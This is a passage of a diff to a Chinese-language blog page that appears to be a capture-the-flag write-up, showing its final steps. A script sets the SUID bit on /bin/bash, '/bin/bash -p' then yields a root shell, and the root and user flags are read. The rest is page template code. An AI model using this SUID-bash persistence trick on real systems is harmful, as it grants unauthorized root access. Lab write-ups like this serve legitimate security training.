+<p>脚本还顺手执行了 <code>chmod u+s /bin/bash</code>，后面直接用 <code>/bin/bash -p</code> 拿持久 root shell：</p>
+<pre lang="bash"><code>/bin/bash -p
+id
+</code></pre>
+<pre><code>uid=33(www-data) gid=33(www-data) euid=0(root)
 </code></pre>
 <h1>Flag</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">cat /home/welcome/user.txt
-cat /root/root.txt</pre></div>
-<pre class="notranslate"><code class="notranslate">flag{user-1e34287df8a27d2bbfa5ff51abb3d2ff}
+<pre lang="bash"><code>cat /home/welcome/user.txt
+cat /root/root.txt
+</code></pre>
+<pre><code>flag{user-1e34287df8a27d2bbfa5ff51abb3d2ff}
 flag{root-a5e1f6d2cd2448650c88a8985cfb6365}
-</code></pre></div>
+</code></pre>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -459,7 +480,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -506,70 +527,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
